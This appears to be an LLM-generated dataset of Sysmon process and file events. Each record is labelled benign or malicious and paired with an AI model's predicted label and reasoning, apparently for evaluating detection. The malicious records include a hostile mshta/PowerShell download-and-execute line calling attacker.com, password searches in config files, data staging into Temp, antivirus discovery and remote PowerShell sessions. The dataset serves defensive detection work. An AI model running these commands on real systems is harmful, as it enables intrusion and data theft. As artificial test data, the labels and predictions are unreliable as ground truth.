{"EventID": 1, "EventTime": "2025-10-10 08:01:30", "UtcTime": "2025-10-10T08:01:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c ipconfig /all", "ProcessId": "3456", "ProcessGUID": "{de006b50-1436-5eb5-1000-000000000c00}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:30] | PID=3456 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c ipconfig /all", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing ipconfig /all from explorer.exe to view network configuration - standard network troubleshooting activity by a regular user.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil2.ps1')\"\":close\")", "ProcessId": "7924", "ProcessGUID": "{6bbf237a-1ef4-5eac-1ef4-000000001ef4}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1352", "ParentProcessGUID": "{6bbf237a-0548-5eac-0548-000000000548}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lolbin_execution", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=7924 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\mshta.exe | Parent=C:\\Windows\\explorer.exe | CMD=mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/evil2.ps1')\"\":close\")", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Mshta.exe executing inline VBScript to launch PowerShell with execution policy bypass and downloading a remote script from attacker.com - classic fileless malware delivery and command-and-control pattern.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 11, "EventTime": "2025-10-10 08:01:50", "UtcTime": "2025-10-10T08:01:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "1456", "ProcessGUID": "{169accd1-9fa5-e844-1a00-000000000e00}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\TempFile.tmp", "CreationUtcTime": "2025-10-10T08:01:50.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:50] | PID=1456 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\RuntimeBroker.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "RuntimeBroker.exe is a legitimate Windows system process that manages permissions for Windows Store apps and runs normally in the background. No suspicious command-line arguments or unusual context detected.", "confidence": "high", "attack_technique": ""}}
{"EventID": 15, "EventTime": "2025-10-10 08:02:50", "UtcTime": "2025-10-10T08:02:50.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2009", "ProcessGUID": "{12345678-1234-5678-1234-567812340013}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Wireshark\\Wireshark.exe", "TargetFilename": "C:\\Users\\user\\capture.pcapng", "CreationUtcTime": "2025-10-10T08:02:50.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:50] | PID=2009 | User=WORKSTATION\\user | Image=C:\\Program Files\\Wireshark\\Wireshark.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Wireshark network analyzer launched by a regular user from its standard installation directory - legitimate network troubleshooting or analysis tool usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-10 08:00:30", "UtcTime": "2025-10-10T08:00:30.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2002", "ProcessGUID": "{12345678-1234-5678-1234-567812340003}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Notepad++\\notepad++.exe", "TargetFilename": "C:\\Users\\user\\test.txt", "CreationUtcTime": "2025-10-10T08:00:30.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:30] | PID=2002 | User=WORKSTATION\\user | Image=C:\\Program Files\\Notepad++\\notepad++.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Notepad++ text editor launched by a regular user account - standard legitimate application usage with no suspicious command-line arguments or context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-09 15:36:30", "UtcTime": "2025-10-09T15:36:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ProcessId": "7845", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000404}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "56789", "DestinationIp": "10.0.0.100", "DestinationPort": "443", "DestinationHostname": "fileserver.corp.local", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:30] | PID=7845 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word (WINWORD.EXE) running from legitimate Office installation directory by domain user - standard office application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-10 08:03:30", "UtcTime": "2025-10-10T08:03:30.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2011", "ProcessGUID": "{12345678-1234-5678-1234-567812340015}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "TargetFilename": "C:\\Users\\user\\video.mp4", "CreationUtcTime": "2025-10-10T08:03:30.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:30] | PID=2011 | User=WORKSTATION\\user | Image=C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "VLC media player execution from legitimate installation directory - standard user application activity with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:00", "UtcTime": "2025-10-10T08:02:00.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\7-Zip\\7zFM.exe", "CommandLine": "C:\\Program Files\\7-Zip\\7zFM.exe", "ProcessId": "2007", "ProcessGUID": "{12345678-1234-5678-1234-567812340010}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:00] | PID=2007 | User=WORKSTATION\\user | Image=C:\\Program Files\\7-Zip\\7zFM.exe | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\7-Zip\\7zFM.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "7-Zip file manager launched by Windows Explorer with standard user interaction - normal file compression/extraction activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:50", "UtcTime": "2025-10-10T08:00:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Chrome\\chrome.exe", "CommandLine": "C:\\Program Files\\Chrome\\chrome.exe --type=renderer --user-data-dir=C:\\Users\\jsmith\\AppData\\Local\\Google\\Chrome\\User Data", "ProcessId": "1234", "ProcessGUID": "{bc11682e-0103-5eb2-1000-000000000900}", "ParentImage": "C:\\Program Files\\Chrome\\chrome.exe", "ParentProcessId": "5678", "ParentProcessGUID": "{dac2793f-1214-5eb3-1000-000000000a00}", "ParentCommandLine": "C:\\Program Files\\Chrome\\chrome.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:50] | PID=1234 | User=CORP\\jsmith | Image=C:\\Program Files\\Chrome\\chrome.exe | Parent=C:\\Program Files\\Chrome\\chrome.exe | CMD=C:\\Program Files\\Chrome\\chrome.exe --type=renderer --user-data-dir=C:\\Users\\jsmith\\AppData\\Local\\Google\\Chrome\\User Data", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Chrome browser spawning a renderer process with standard user data directory - normal browser operation for rendering web pages.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:45", "UtcTime": "2020-05-01T22:57:45.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /resume && bitsadmin /transfer job1 /complete", "ProcessId": "1289", "ProcessGUID": "{6bbf237a-0509-5eac-0509-000000000509}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1111", "ParentProcessGUID": "{6bbf237a-0457-5eac-0457-000000000457}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:45] | PID=1289 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /resume && bitsadmin /transfer job1 /complete", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using bitsadmin via cmd.exe spawned from explorer.exe is highly suspicious - indicates potential malware using BITS for file transfer/download with unusual parent-child relationship.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:40", "UtcTime": "2020-05-01T22:56:40.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c compact /c /s:C:\\Users\\pbeesly\\AppData\\Local\\Temp\\SensitiveData", "ProcessId": "1256", "ProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe /c mkdir C:\\ProgramData\\Microsoft\\Windows\\UpdateCache", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:40] | PID=1256 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=cmd.exe /c compact /c /s:C:\\Users\\pbeesly\\AppData\\Local\\Temp\\SensitiveData", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using compact.exe to compress files in a Temp directory named \"SensitiveData\" indicates data staging for exfiltration, preparing collected sensitive data for transfer.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:58:27", "UtcTime": "2020-05-01T22:58:27.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding", "ProcessId": "9552", "ProcessGUID": "{6bbf237a-2550-5eac-2550-000000002550}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": "912", "ParentProcessGUID": "{6bbf237a-0390-5eac-0390-000000000390}", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:58:27] | PID=9552 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe | Parent=C:\\Windows\\System32\\svchost.exe | CMD=C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -Embedding", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "WmiPrvSE.exe (WMI Provider Host) launched by svchost.exe with -Embedding parameter is standard Windows Management Instrumentation operation for handling WMI requests.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all", "ProcessId": "17028", "ProcessGUID": "{6bbf237a-4284-5eac-4284-000000004284}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "17024", "ParentProcessGUID": "{6bbf237a-4280-5eac-4280-000000004280}", "ParentCommandLine": "cmd.exe /c systeminfo", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "system_reconnaissance", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=17028 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\whoami.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=whoami /all", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "The 'whoami /all' command is commonly used for reconnaissance to enumerate user privileges, group memberships, and security identifiers - typical post-exploitation behavior to assess current access level.", "confidence": "medium", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:11", "UtcTime": "2020-05-01T22:56:11.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\explorer.exe", "CommandLine": "C:\\Windows\\explorer.exe", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": "111", "ParentProcessGUID": "{6bbf237a-006f-5eac-006f-00000000006f}", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:11] | PID=1234 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\explorer.exe | Parent=C:\\Windows\\System32\\services.exe | CMD=C:\\Windows\\explorer.exe", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Explorer.exe running under NETWORK SERVICE account with services.exe as parent is highly suspicious - explorer.exe should run under user context with parent userinit.exe, indicating potential process injection or privilege escalation.", "confidence": "high", "attack_technique": "privilege_escalation"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:12", "UtcTime": "2020-05-01T22:56:12.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe  Get-Process | Select-Object Name,Id,Path", "ProcessId": "13477", "ProcessGUID": "{6bbf237a-34a5-5eac-34a5-0000000034a5}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "13456", "ParentProcessGUID": "{6bbf237a-3490-5eac-3490-000000003490}", "ParentCommandLine": "cmd.exe /c tasklist /v", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "process_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:12] | PID=13477 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell.exe  Get-Process | Select-Object Name,Id,Path", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "PowerShell command listing running processes with basic properties (Name, ID, Path) - standard system administration or troubleshooting activity with no indicators of malicious intent.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:10", "UtcTime": "2025-10-10T08:02:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msedge.exe", "CommandLine": "\"C:\\Windows\\System32\\msedge.exe\" --profile-directory=Default --app=https://example.com", "ProcessId": "1678", "ProcessGUID": "{38caef33-b1c7-0a66-1c00-000000001000}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:10] | PID=1678 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msedge.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Windows\\System32\\msedge.exe\" --profile-directory=Default --app=https://example.com", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Edge browser launched by Windows Explorer with a normal web application URL - standard user browsing activity with legitimate parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:10", "UtcTime": "2025-10-10T08:03:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Wireshark\\Wireshark.exe", "CommandLine": "C:\\Program Files\\Wireshark\\Wireshark.exe", "ProcessId": "9012", "ProcessGUID": "{4577e2b7-2ba9-5ebc-1000-000000001300}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\Wireshark\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:10] | PID=9012 | User=CORP\\jsmith | Image=C:\\Program Files\\Wireshark\\Wireshark.exe | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Wireshark\\Wireshark.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Wireshark launched by user jsmith from Windows Explorer - standard application execution for legitimate network analysis or troubleshooting purposes.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:45", "UtcTime": "2020-05-01T22:55:45.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "ProcessId": "4328", "ProcessGUID": "{6bbf237a-10e8-5eac-10e8-0000000010e8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2140", "ParentProcessGUID": "{6bbf237a-085c-5eac-085c-00000000085c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "security_software_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:45] | PID=4328 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC querying antivirus products running as SYSTEM with unusual parent process (explorer.exe). This is reconnaissance to identify security tools before attack, and the parent-child relationship is suspicious.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell Enter-PSSession -ComputerName DESKTOP-TARGET", "ProcessId": "1210", "ProcessGUID": "{6bbf237a-04ba-5eac-04ba-0000000004ba}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1156", "ParentProcessGUID": "{6bbf237a-0484-5eac-0484-000000000484}", "ParentCommandLine": "cmd.exe /c powershell Enter-PSSession -ComputerName DESKTOP-TARGET", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1210 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell Enter-PSSession -ComputerName DESKTOP-TARGET", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell Enter-PSSession command executed by SYSTEM account to establish remote interactive session with another computer, indicating lateral movement activity.", "confidence": "high", "attack_technique": "lateral_movement"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:45", "UtcTime": "2020-05-01T22:56:45.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -command Compress-Archive -Path C:\\Data\\SalesData\\*.xlsx -DestinationPath C:\\Windows\\Temp\\update.zip", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:45] | PID=1267 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell.exe -command Compress-Archive -Path C:\\Data\\SalesData\\*.xlsx -DestinationPath C:\\Windows\\Temp\\update.zip", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell compressing Excel files from a data directory to Windows\\Temp with a misleading filename (update.zip) - classic data staging for exfiltration pattern.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:00", "UtcTime": "2020-05-01T22:57:00.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c copy C:\\Windows\\Temp\\update.zip C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\update.zip", "ProcessId": "1278", "ProcessGUID": "{6bbf237a-04fe-5eac-04fe-0000000004fe}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:00] | PID=1278 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c copy C:\\Windows\\Temp\\update.zip C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\update.zip", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Copying a zip file from Temp to Windows Error Reporting directory suggests data staging behavior - using legitimate Windows directories to hide malicious files or stage data for exfiltration.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:27", "UtcTime": "2020-05-01T22:56:27.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /si password *.xml *.config *.txt", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:27] | PID=1245 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /si password *.xml *.config *.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Findstr command searching for passwords in configuration and text files - classic credential discovery technique used to harvest stored credentials from system files.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Enter-PSSession -ComputerName TARGET-PC", "ProcessId": "1255", "ProcessGUID": "{6bbf237a-04e7-5eac-04e7-0000000004e7}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1255 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\explorer.exe | CMD=powershell Enter-PSSession -ComputerName TARGET-PC", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell initiated by NETWORK SERVICE account (unusual for interactive sessions) executing Enter-PSSession for remote 